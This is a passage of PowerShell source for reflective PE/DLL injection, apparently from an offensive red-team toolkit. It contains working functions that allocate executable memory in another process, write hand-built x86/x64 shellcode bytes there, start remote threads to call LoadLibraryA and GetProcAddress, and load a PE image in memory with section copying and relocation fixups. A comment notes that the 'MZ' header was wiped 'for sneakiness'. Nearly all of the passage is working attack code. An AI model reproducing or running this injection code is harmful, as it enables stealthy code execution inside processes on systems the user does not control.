			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
